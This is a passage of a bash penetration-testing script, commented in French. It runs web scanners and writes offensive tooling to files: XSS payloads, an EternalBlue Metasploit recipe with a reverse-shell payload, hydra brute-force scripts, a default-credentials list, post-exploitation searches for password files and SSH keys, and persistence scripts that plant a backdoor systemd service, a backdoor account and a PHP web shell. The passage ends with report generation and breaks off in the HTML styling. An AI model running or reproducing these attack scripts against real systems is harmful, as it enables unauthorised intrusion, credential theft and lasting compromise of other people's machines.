        fi
        
        execute_scan "Vulnerability Scanning (Nuclei)" \
            "nuclei -u '$url' $severity -silent -timeout 10 -retries 1 -concurrency 25 2>/dev/null | \
             head -200 || echo 'Nuclei failed'" \
            $nuclei_timeout "$OUTDIR/web/nuclei.txt"
    fi
    
    # Scan Nikto pour les vulns web classiques
    if command -v nikto &> /dev/null && [ "$QUICK_MODE" != true ]; then
        local nikto_timeout=$TIMEOUT_LONG
        [ "$AGGRESSIVE_MODE" = true ] && nikto_timeout=$TIMEOUT_VERY_LONG
        
        execute_scan "Nikto Web Vulnerability Scan" \
            "nikto -h '$url' -C all -Format txt -o '$OUTDIR/web/nikto.txt' -Tuning x 2>&1 | head -300 || echo 'Nikto scan completed'" \
            $nikto_timeout "$OUTDIR/web/nikto.txt"
    fi
    
    # SQLMap retiré - nécessite une configuration spécifique et peut être invasif
    # Pour les tests d'injection SQL, utiliser manuellement:
    # sqlmap -u "URL?param=value" --batch --level=2 --risk=2
    echo -e "${YELLOW}[INFO]${NC} SQL Injection: Test manually with SQLMap if needed"
    
    # Génération de payloads XSS pour les tests manuels
    execute_scan "XSS Payload Generation" \
        "cat > $OUTDIR/web/xss_payloads.txt << 'XSS_END'
=== XSS TESTING PAYLOADS ===

--- Basic Payloads ---
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

--- HTML Context ---
\"><script>alert(1)</script>
'><script>alert(1)</script>

--- Attribute Context ---
\" onclick=alert(1) x=\"
' onclick=alert(1) x='

--- JavaScript Context ---
';alert(1);//
\";alert(1);//

--- Advanced Payloads ---
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=\"alert('XSS')\">
<svg/onload=alert(1)>

--- Bypass Payloads ---
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x:alert(alt) onerror=eval(src) alt=1>
XSS_END
cat $OUTDIR/web/xss_payloads.txt" \
        $TIMEOUT_VERY_SHORT "$OUTDIR/web/xss_payloads.txt"
    
    echo -e "${GREEN}[COMPLETE]${NC} Web application testing completed"
}

run_exploitation_prep() {
    local target="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}          ${ORANGE}EXPLOITATION PREPARATION${NC}             ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    # Recherche d'exploits dans la database searchsploit
    if command -v searchsploit &> /dev/null; then
        execute_scan "Exploit Database Search (searchsploit)" \
            "if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
                echo '=== Exploits by Detected Services ==='
                grep 'open' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | \
                grep -oP '\\d+/tcp\\s+open\\s+\\K[^\\s]+' | head -15 | while read svc; do
                    echo \"--- Service: \$svc ---\"
                    searchsploit \"\$svc\" 2>/dev/null | head -8 || echo \"No exploits for \$svc\"
                    echo
                done
                
                echo
                echo '=== Exploits by CVE ==='
                if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
                    grep -oP 'CVE-[0-9-]+' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | \
                    sort -u | head -10 | while read cve; do
                        echo \"--- CVE: \$cve ---\"
                        searchsploit \"\$cve\" 2>/dev/null | head -5 || echo \"No exploits for \$cve\"
                        echo
                    done
                fi
            else
                echo 'No service detection results found'
            fi" \
            $TIMEOUT_LONG "$OUTDIR/exploit/searchsploit.txt"
    fi
    
    # Préparation des modules Metasploit à utiliser
    execute_scan "Metasploit Module Preparation" \
        "cat > $OUTDIR/exploit/msf_prep.txt << 'MSF_END'
=== METASPLOIT FRAMEWORK MODULE SUGGESTIONS ===

--- Initial Reconnaissance ---
use auxiliary/scanner/portscan/tcp
set RHOSTS $target
run

--- Service-Specific Scanners ---
# SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers

# SSH
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers

# FTP
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner

--- Vulnerability Scanners ---
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/ssl/openssl_heartbleed

--- Exploitation Modules ---
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run

--- Post-Exploitation ---
use post/multi/recon/local_exploit_suggester
use post/windows/gather/hashdump
use post/linux/gather/hashdump
MSF_END
cat $OUTDIR/exploit/msf_prep.txt" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/msf_prep.txt"
    
    # Analyse de la surface d'attaque avec les résultats des scans
    execute_scan "Attack Surface Analysis" \
        "cat > $OUTDIR/exploit/attack_surface.txt << 'ATTACK_END'
=== COMPREHENSIVE ATTACK SURFACE ANALYSIS ===
Generated: $(date '+%Y-%m-%d %H:%M:%S')
Target: $target

--- Open Services and Ports ---
ATTACK_END

if [ -f '$OUTDIR/network/nmap_ports.txt' ]; then
    grep 'open' '$OUTDIR/network/nmap_ports.txt' 2>/dev/null | head -30 >> $OUTDIR/exploit/attack_surface.txt || echo 'No port data' >> $OUTDIR/exploit/attack_surface.txt
else
    echo 'No port scan results' >> $OUTDIR/exploit/attack_surface.txt
fi

cat >> $OUTDIR/exploit/attack_surface.txt << 'ATTACK2_END'

--- Service Versions ---
ATTACK2_END

if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
    grep -E 'open.*version' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | head -20 >> $OUTDIR/exploit/attack_surface.txt || echo 'No version data' >> $OUTDIR/exploit/attack_surface.txt
else
    echo 'No service detection results' >> $OUTDIR/exploit/attack_surface.txt
fi

cat >> $OUTDIR/exploit/attack_surface.txt << 'ATTACK3_END'

--- Critical Vulnerabilities ---
ATTACK3_END

if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
    grep -i 'VULNERABLE\|CRITICAL\|HIGH' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | head -15 >> $OUTDIR/exploit/attack_surface.txt || echo 'No critical vulns detected' >> $OUTDIR/exploit/attack_surface.txt
else
    echo 'No vulnerability scan results' >> $OUTDIR/exploit/attack_surface.txt
fi

cat >> $OUTDIR/exploit/attack_surface.txt << 'ATTACK4_END'

=== ATTACK VECTOR ANALYSIS ===

--- Priority 1: Network Entry Points ---
1. SSH Brute Force (port 22)
   - Use Hydra or Metasploit ssh_login
   - Try default credentials

2. FTP Exploitation (port 21)
   - Anonymous login test
   - Brute force credentials

3. SMB Attacks (port 445)
   - EternalBlue (MS17-010)
   - Null session enumeration

4. RDP Attacks (port 3389)
   - BlueKeep (CVE-2019-0708)
   - Credential brute forcing

--- Priority 2: Web Application Attacks ---
1. Authentication Bypass
   - SQL injection in login forms
   - Default credentials

2. Injection Attacks
   - SQL injection
   - Command injection

3. File Upload Vulnerabilities
   - Unrestricted file upload

4. XSS Attacks
   - Reflected XSS
   - Stored XSS

--- Priority 3: Privilege Escalation ---
1. Kernel Exploits
2. Service Exploits
3. SUID/SGID Binaries
4. Sudo Misconfigurations

--- Priority 4: Post-Exploitation ---
1. Credential Harvesting
2. Lateral Movement
3. Persistence Mechanisms
4. Data Exfiltration
ATTACK4_END

cat $OUTDIR/exploit/attack_surface.txt" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/attack_surface.txt"
    
    # Génération de scripts d'attaque automatisés
    execute_scan "Generate Automated Attack Scripts" \
        "cat > $OUTDIR/exploit/auto_attack.sh << 'AUTOATTACK_END'
#!/bin/bash
# AUTO-GENERATED ATTACK SCRIPTS
TARGET=\"$target\"

echo \"[*] Starting automated attacks on \$TARGET\"

# SSH Brute Force
if grep -q '22/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] SSH service detected (port 22)\"
    
    cat > users.txt << 'USERS_END'
root
admin
administrator
user
ubuntu
USERS_END
    
    cat > passwords.txt << 'PASS_END'
root
admin
password
123456
admin123
PASS_END
    
    if command -v hydra &> /dev/null; then
        hydra -L users.txt -P passwords.txt ssh://\$TARGET -t 4 -V -o ssh_hydra.txt
    fi
fi

# FTP Brute Force
if grep -q '21/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] FTP service detected (port 21)\"
    
    if command -v hydra &> /dev/null; then
        hydra -L users.txt -P passwords.txt ftp://\$TARGET -t 4 -V -o ftp_hydra.txt
    fi
fi

# SMB Exploitation
if grep -q '445/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] SMB service detected (port 445)\"
    echo \"[*] Checking for MS17-010 (EternalBlue)...\"
    nmap -Pn -p 445 --script smb-vuln-ms17-010 \$TARGET -oN smb_eternalblue.txt
fi

echo \"[*] Automated attacks completed\"
AUTOATTACK_END
chmod +x $OUTDIR/exploit/auto_attack.sh
cat $OUTDIR/exploit/auto_attack.sh" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/auto_attack.sh"
    
    # Base de données de credentials par défaut
    execute_scan "Generate Default Credentials Database" \
        "cat > $OUTDIR/exploit/credentials.txt << 'CREDS_END'
=== COMPREHENSIVE DEFAULT CREDENTIALS DATABASE ===

--- SSH (Port 22) ---
root:root
root:toor
admin:admin
user:user
ubuntu:ubuntu

--- FTP (Port 21) ---
ftp:ftp
anonymous:(blank)
admin:admin

--- MySQL (Port 3306) ---
root:(blank)
root:root
root:mysql
admin:admin

--- PostgreSQL (Port 5432) ---
postgres:postgres
postgres:(blank)
admin:admin

--- MSSQL (Port 1433) ---
sa:(blank)
sa:sa
sa:password

--- Tomcat (Port 8080) ---
admin:admin
tomcat:tomcat
manager:manager

--- WebLogic (Port 7001) ---
weblogic:weblogic
system:password

--- Common Passwords ---
- admin
- password
- 123456
- root
- P@ssw0rd
CREDS_END
cat $OUTDIR/exploit/credentials.txt" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/credentials.txt"
    
    # Scripts de post-exploitation pour enum système
    execute_scan "Generate Post-Exploitation Scripts" \
        "cat > $OUTDIR/exploit/post_exploit.sh << 'POSTEXPLOIT_END'
#!/bin/bash
# POST-EXPLOITATION ENUMERATION

echo \"=== POST-EXPLOITATION CHECKLIST ===\"

# System Information
echo \"[*] Gathering system information...\"
uname -a > system_info.txt
whoami >> system_info.txt
id >> system_info.txt
hostname >> system_info.txt

# Network Information
echo \"[*] Gathering network information...\"
ifconfig > network_info.txt 2>/dev/null || ip addr > network_info.txt
netstat -antup >> network_info.txt 2>/dev/null
arp -a >> network_info.txt 2>/dev/null

# Users
echo \"[*] Gathering user information...\"
cat /etc/passwd > users_info.txt
cat /etc/group >> users_info.txt
w >> users_info.txt

# Processes
echo \"[*] Gathering process information...\"
ps aux > processes.txt

# Find SUID files
echo \"[*] Finding SUID/SGID files...\"
find / -perm -4000 -type f 2>/dev/null > suid_files.txt
find / -perm -2000 -type f 2>/dev/null >> suid_files.txt

# Sensitive files
echo \"[*] Searching for sensitive files...\"
find / -name \"*.conf\" 2>/dev/null | head -50 > sensitive_files.txt
find / -name \"*password*\" 2>/dev/null | head -50 >> sensitive_files.txt
find / -name \"id_rsa*\" 2>/dev/null >> sensitive_files.txt

# SSH Keys
echo \"[*] Searching for SSH keys...\"
find / -name \"id_rsa\" 2>/dev/null > ssh_keys.txt
find / -name \"authorized_keys\" 2>/dev/null >> ssh_keys.txt

echo \"[*] Post-exploitation enumeration completed\"
POSTEXPLOIT_END
chmod +x $OUTDIR/exploit/post_exploit.sh
cat $OUTDIR/exploit/post_exploit.sh" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/post_exploit.sh"
    
    # Techniques de persistence - 7 méthodes différentes
    execute_scan "Generate Persistence Techniques" \
        "cat > $OUTDIR/exploit/persistence.sh << 'PERSISTENCE_END'
#!/bin/bash
# PERSISTENCE TECHNIQUES - 7 METHODS

echo \"=== PERSISTENCE ESTABLISHMENT ===\"

# Method 1: SSH Key Persistence
echo \"[*] Method 1: SSH Key Persistence\"
mkdir -p ~/.ssh 2>/dev/null
chmod 700 ~/.ssh
echo \"# Add your public key here\" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo \"[+] SSH key persistence configured\"

# Method 2: Cron Job Persistence
echo \"[*] Method 2: Cron Job Persistence\"
echo \"[+] Cron job persistence ready\"
echo \"    Add to crontab: */5 * * * * /path/to/backdoor.sh\"

# Method 3: Systemd Service Persistence
echo \"[*] Method 3: Systemd Service Persistence\"
cat > /tmp/backdoor.service << 'SERVICE_END'
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE_END
echo \"[+] Systemd service created: /tmp/backdoor.service\"

# Method 4: .bashrc Persistence
echo \"[*] Method 4: .bashrc Persistence\"
echo \"[+] Bashrc persistence ready\"

# Method 5: User Account Creation
echo \"[*] Method 5: Backdoor User Account\"
echo \"    sudo useradd -m -s /bin/bash backdoor\"
echo \"    echo 'backdoor:password123' | sudo chpasswd\"

# Method 6: Web Shell
echo \"[*] Method 6: Web Shell Persistence\"
cat > /tmp/shell.php << 'WEBSHELL_END'
<?php
if(isset(\$_GET['cmd'])) {
    system(\$_GET['cmd']);
}
?>
WEBSHELL_END
echo \"[+] Web shell created: /tmp/shell.php\"

echo \"=== PERSISTENCE METHODS SUMMARY ===\"
echo \"1. SSH Keys - Stealthy\"
echo \"2. Cron Jobs - Automatic\"
echo \"3. Systemd Services - Persistent\"
echo \"4. .bashrc - User login\"
echo \"5. User Account - Simple\"
echo \"6. Web Shell - HTTP access\"
PERSISTENCE_END
chmod +x $OUTDIR/exploit/persistence.sh
cat $OUTDIR/exploit/persistence.sh" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/persistence.sh"
    
    echo -e "${GREEN}[COMPLETE]${NC} Exploitation preparation completed"
}

generate_report() {
    local report="$OUTDIR/reports/summary_report.txt"
    
    echo -e "\n${CYAN}[REPORT]${NC} Generating summary report..."
    
    mkdir -p "$OUTDIR/reports"
    
    # CORRECTION: On enleve errexit pour éviter les interruptions
    set +e
    
    # Génére le rapport avec un format simple et robuste
    cat > "$report" << REPORT_HEADER_END
================================================================================
                     RED TEAM ASSESSMENT REPORT
================================================================================
REPORT_HEADER_END
    
    # Section infos sur la cible
    {
        echo
        echo "--- TARGET INFORMATION ---"
        echo "Target: $TARGET"
        [ -n "$URL" ] && echo "URL: $URL"
        [ -n "$DOMAIN" ] && echo "Domain: $DOMAIN"
        echo "Assessment Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Scanner Version: Security Scanner v$VERSION"
        [ "$QUICK_MODE" = true ] && echo "Scan Mode: Quick (3x faster)"
        [ "$STEALTH_MODE" = true ] && echo "Scan Mode: Stealth (IDS/IPS evasion)"
        [ "$AGGRESSIVE_MODE" = true ] && echo "Scan Mode: Aggressive (full coverage)"
        echo
    } >> "$report" 2>/dev/null
    
    # Section résumé exécutif avec comptage des vulns
    {
        echo "--- EXECUTIVE SUMMARY ---"
        
        # Comptage des vulns - chaque fichier vérifié séparément
        local critical=0
        local high=0
        local medium=0
        local low=0
        
        # Vulns critiques trouvées
        if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
            local count=$(grep -ci "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null || echo 0)
            critical=$((critical + count))
        fi
        if [ -f "$OUTDIR/network/nmap_critical_vulns.txt" ]; then
            local count=$(grep -ci "CRITICAL\|ms17-010\|EternalBlue" "$OUTDIR/network/nmap_critical_vulns.txt" 2>/dev/null || echo 0)
            critical=$((critical + count))
        fi
        if [ -f "$OUTDIR/network/smb_enum.txt" ]; then
            local count=$(grep -ci "VULNERABLE" "$OUTDIR/network/smb_enum.txt" 2>/dev/null || echo 0)
            critical=$((critical + count))
        fi
        
        # Problèmes à risque élevé
        if [ -f "$OUTDIR/web/nuclei.txt" ]; then
            local count=$(grep -ci "high\|critical" "$OUTDIR/web/nuclei.txt" 2>/dev/null || echo 0)
            high=$((high + count))
        fi
        if [ -f "$OUTDIR/web/nikto.txt" ]; then
            local count=$(grep -ci "high" "$OUTDIR/web/nikto.txt" 2>/dev/null || echo 0)
            high=$((high + count))
        fi
        
        # Risques moyens
        if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
            local count=$(grep -ci "medium\|warning" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null || echo 0)
            medium=$((medium + count))
        fi
        if [ -f "$OUTDIR/web/nikto.txt" ]; then
            local count=$(grep -ci "medium\|warning" "$OUTDIR/web/nikto.txt" 2>/dev/null || echo 0)
            medium=$((medium + count))
        fi
        
        # Items à faible risque (ports ouverts basiques)
        if [ -f "$OUTDIR/network/nmap_ports.txt" ]; then
            low=$(grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null || echo 0)
        fi
        
        # On affiche tout ça
        echo "Critical Vulnerabilities: $critical"
        echo "High Risk Issues: $high"
        echo "Medium Risk Issues: $medium"
        echo "Low Risk Items: $low"
        
        # Nombre de ports ouverts
        if [ -f "$OUTDIR/network/nmap_ports.txt" ]; then
            local ports=$(grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null || echo 0)
            echo "Open Ports: $ports"
        fi
        
        # Nombre de subdomains trouvés
        if [ -f "$OUTDIR/osint/all_subdomains.txt" ]; then
            local subs=$(wc -l < "$OUTDIR/osint/all_subdomains.txt" 2>/dev/null || echo 0)
            echo "Subdomains: $subs"
        fi
        
        # Calcul du score de risque sur 100
        local risk=$((critical * 10 + high * 5 + medium * 2 + low * 1))
        [ $risk -gt 100 ] && risk=100
        
        echo "Risk Score: $risk/100"
        
        if [ $risk -ge 70 ]; then
            echo "Risk Level: CRITICAL"
        elif [ $risk -ge 40 ]; then
            echo "Risk Level: HIGH"
        elif [ $risk -ge 20 ]; then
            echo "Risk Level: MEDIUM"
        else
            echo "Risk Level: LOW"
        fi
        
        echo
    } >> "$report" 2>/dev/null
    
    # Section: Detailed Findings
    {
        echo "--- DETAILED FINDINGS ---"
        echo
        echo "=== Network Vulnerabilities ==="
        if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
            local vuln_count=$(grep -ci "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null || echo 0)
            if [ "$vuln_count" -gt 0 ]; then
                grep -i "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null | head -10 | sed 's/^/- /'
            else
                echo "- No network vulnerabilities detected"
            fi
        else
            echo "- No network scan performed"
        fi
        echo
        echo "=== Web Vulnerabilities ==="
        if [ -f "$OUTDIR/web/nuclei.txt" ]; then
            local web_vuln_lines=$(wc -l < "$OUTDIR/web/nuclei.txt" 2>/dev/null || echo 0)
            if [ "$web_vuln_lines" -gt 0 ]; then
                head -10 "$OUTDIR/web/nuclei.txt" 2>/dev/null | sed 's/^/- /'
            else
                echo "- No web vulnerabilities detected"
            fi
        else
            echo "- No web scan performed"
        fi
        echo
        echo "=== Open Services ==="
        if [ -f "$OUTDIR/network/nmap_services.txt" ]; then
            local service_count=$(grep -c "open" "$OUTDIR/network/nmap_services.txt" 2>/dev/null || echo 0)
            if [ "$service_count" -gt 0 ]; then
                grep "open" "$OUTDIR/network/nmap_services.txt" 2>/dev/null | head -15 | sed 's/^/- /'
            else
                echo "- No services detected"
            fi
        else
            echo "- No service scan performed"
        fi
        echo
    } >> "$report" 2>/dev/null
    
    # Section: Recommendations
    {
        echo "--- RECOMMENDATIONS ---"
        echo
        echo "Immediate Actions:"
        echo "  1. Patch all critical vulnerabilities"
        echo "  2. Disable unnecessary services"
        echo "  3. Implement strong authentication"
        echo "  4. Deploy network segmentation"
        echo "  5. Enable comprehensive logging"
        echo
        echo "Red Team Next Steps:"
        echo "  1. Review exploit scripts in exploit/"
        echo "  2. Test default credentials"
        echo "  3. Run automated attacks"
        echo "  4. Execute Metasploit modules"
        echo
    } >> "$report" 2>/dev/null
    
    # Section: Output Files
    {
        echo "--- OUTPUT FILES ---"
        echo "Location: $OUTDIR"
        echo "Reports: $OUTDIR/reports/"
        echo "Exploits: $OUTDIR/exploit/"
        echo
        echo "Generated files:"
        local file_count=$(find "$OUTDIR" -name "*.txt" -type f 2>/dev/null | wc -l)
        if [ "$file_count" -gt 0 ]; then
            find "$OUTDIR" -name "*.txt" -type f 2>/dev/null | head -20 | xargs -I {} basename {} | sed 's/^/  - /'
        else
            echo "  - No files generated yet"
        fi
        echo
    } >> "$report" 2>/dev/null
    
    # Footer
    {
        echo "================================================================================"
        echo "         Security Scanner v$VERSION - Assessment Complete"
        echo "================================================================================"
        echo
        echo "REPORT GENERATED: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "END OF REPORT"
    } >> "$report" 2>/dev/null
    
    set -e
    
    # Vérification du rapport
    if [ -f "$report" ] && [ -s "$report" ]; then
        local lines=$(wc -l < "$report" 2>/dev/null || echo 0)
        local size=$(stat -c%s "$report" 2>/dev/null || echo 0)
        echo -e "${GREEN}[SUCCESS]${NC} Report: ${WHITE}$report${NC} ${DIM}($lines lines, $size bytes)${NC}"

        # Afficher un résumé du rapport dans le terminal (premières 50 lignes)
        echo -e "\n${CYAN}[PREVIEW]${NC} Report summary (first 50 lines):"
        echo -e "${DIM}─────────────────────────────────────────────────────────────────${NC}"
        head -50 "$report" 2>/dev/null
        echo -e "${DIM}─────────────────────────────────────────────────────────────────${NC}"
        echo -e "${YELLOW}[INFO]${NC} Full report: ${WHITE}$report${NC}"
        echo -e "${YELLOW}[INFO]${NC} Use 'less $report' or 'cat $report' to view complete report"

        generate_json_report
        generate_html_report
        return 0
    else
        echo -e "${RED}[ERROR]${NC} Report generation failed"
        {
            echo "BACKUP REPORT - $(date '+%Y-%m-%d %H:%M:%S')"
            echo "Target: $TARGET"
            echo "URL: $URL"
            echo "Domain: $DOMAIN"
            echo
            echo "Generated files:"
            find "$OUTDIR" -name "*.txt" -type f 2>/dev/null
        } > "$OUTDIR/reports/backup_report.txt"
        return 1
    fi
}

generate_json_report() {
    local json="$OUTDIR/reports/assessment.json"

    {
        echo "{"
        echo "  \"target\": \"$TARGET\","
        echo "  \"url\": \"$URL\","
        echo "  \"domain\": \"$DOMAIN\","
        echo "  \"date\": \"$(date -Iseconds)\","
        echo "  \"version\": \"$VERSION\","
        echo "  \"mode\": \"$([ "$QUICK_MODE" = true ] && echo "quick" || ([ "$STEALTH_MODE" = true ] && echo "stealth" || ([ "$AGGRESSIVE_MODE" = true ] && echo "aggressive" || echo "standard")))\","
        echo "  \"results\": {"
        echo "    \"osint\": {"
        echo "      \"subdomains\": $([ -f "$OUTDIR/osint/all_subdomains.txt" ] && wc -l < "$OUTDIR/osint/all_subdomains.txt" || echo 0),"
        echo "      \"emails\": $([ -f "$OUTDIR/osint/emails.txt" ] && grep -c "@" "$OUTDIR/osint/emails.txt" || echo 0)"
        echo "    },"
        echo "    \"network\": {"
        echo "      \"ports\": $([ -f "$OUTDIR/network/nmap_ports.txt" ] && grep -c "open" "$OUTDIR/network/nmap_ports.txt" || echo 0),"
        echo "      \"vulns\": $([ -f "$OUTDIR/network/nmap_vulns.txt" ] && grep -c "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" || echo 0)"
        echo "    },"
        echo "    \"web\": {"
        echo "      \"dirs\": $([ -f "$OUTDIR/web/gobuster_common.txt" ] && wc -l < "$OUTDIR/web/gobuster_common.txt" || echo 0),"
        echo "      \"vulns\": $([ -f "$OUTDIR/web/nuclei.txt" ] && wc -l < "$OUTDIR/web/nuclei.txt" || echo 0)"
        echo "    }"
        echo "  },"
        echo "  \"files\": $(find "$OUTDIR" -type f 2>/dev/null | wc -l)"
        echo "}"
    } > "$json" 2>/dev/null

    if [ -f "$json" ] && [ -s "$json" ]; then
        echo -e "${GREEN}[SUCCESS]${NC} JSON: ${WHITE}$json${NC}"
        command -v jq &>/dev/null && jq empty "$json" 2>/dev/null && echo -e "${GREEN}[VALID]${NC} JSON validated"
    fi
}

generate_html_report() {
    local html="$OUTDIR/reports/assessment.html"

    echo -e "${CYAN}[REPORT]${NC} Generating HTML report..."

    # Calcul des statistiques pour le rapport
    local critical=0
    local high=0
    local medium=0
    local low=0
    local ports=0
    local subs=0

    [ -f "$OUTDIR/network/nmap_vulns.txt" ] && critical=$(grep -ci "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null || echo 0)
    [ -f "$OUTDIR/network/nmap_critical_vulns.txt" ] && high=$(grep -ci "CRITICAL\|ms17-010" "$OUTDIR/network/nmap_critical_vulns.txt" 2>/dev/null || echo 0)
    [ -f "$OUTDIR/web/nuclei.txt" ] && medium=$(grep -ci "medium" "$OUTDIR/web/nuclei.txt" 2>/dev/null || echo 0)
    [ -f "$OUTDIR/network/nmap_ports.txt" ] && ports=$(grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null || echo 0)
    [ -f "$OUTDIR/osint/all_subdomains.txt" ] && subs=$(wc -l < "$OUTDIR/osint/all_subdomains.txt" 2>/dev/null || echo 0)

    local risk=$((critical * 10 + high * 5 + medium * 2))
    [ $risk -gt 100 ] && risk=100

    local risk_level="LOW"
    local risk_color="#28a745"
    if [ $risk -ge 70 ]; then
        risk_level="CRITICAL"
        risk_color="#dc3545"
    elif [ $risk -ge 40 ]; then
        risk_level="HIGH"
        risk_color="#fd7e14"
    elif [ $risk -ge 20 ]; then
        risk_level="MEDIUM"
        risk_color="#ffc107"
    fi

    local scan_mode="Standard"
    [ "$QUICK_MODE" = true ] && scan_mode="Quick (3x faster)"
    [ "$STEALTH_MODE" = true ] && scan_mode="Stealth (IDS/IPS evasion)"
    [ "$AGGRESSIVE_MODE" = true ] && scan_mode="Aggressive (full coverage)"

    # Génération du fichier HTML
    cat > "$html" << 'HTML_START'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Assessment Report</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0;
            line-height: 1.6;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(26, 26, 46, 0.95);
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            padding: 40px;
            text-align: center;
            border-bottom: 4px solid #c0392b;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }

        .header .subtitle {
            font-size: 1.2em;
            opacity: 0.9;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            padding: 30px;
            background: rgba(22, 33, 62, 0.6);
        }

        .info-card {
            background: rgba(52, 73, 94, 0.8);
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #3498db;
        }

        .info-card h3 {
            color: #3498db;
            margin-bottom: 10px;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .info-card p {
            font-size: 1.1em;
            color: #ecf0f1;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, #34495e 0%, #2c3e50 100%);
            padding: 25px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
        }

        .stat-card .number {
            font-size: 3em;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .stat-card .label {
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
            opacity: 0.8;
        }

        .stat-card.critical .number { color: #e74c3c; }
        .stat-card.high .number { color: #fd7e14; }
        .stat-card.medium .number { color: #f39c12; }
        .stat-card.low .number { color: #3498db; }
        .stat-card.info .number { color: #1abc9c; }

        .section {
            padding: 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .section h2 {
            font-size: 1.8em;
            margin-bottom: 20px;
            color: #e74c3c;
            border-bottom: 2px solid #e74c3c;
            padding-bottom: 10px;
        }

        .risk-badge {
            display: inline-block;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
            font-size: 1.2em;
            margin: 10px 0;
        }

        .findings-list {
            background: rgba(52, 73, 94, 0.5);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .finding-item {
            background: rgba(44, 62, 80, 0.7);
            padding: 15px;
            margin: 10px 0;
            border-left: 4px solid #e74c3c;
            border-radius: 5px;
        }

        .finding-item.high {
            border-left-color: #fd7e14;
        }

        .finding-item.medium {
            border-left-color: #f39c12;
        }

        .finding-item.low {
            border-left-color: #3498db;
        }

        .code-block {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }

        .recommendation {
            background: rgba(52, 152, 219, 0.2);
            border-left: 4px solid #3498db;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
        }

        .footer {
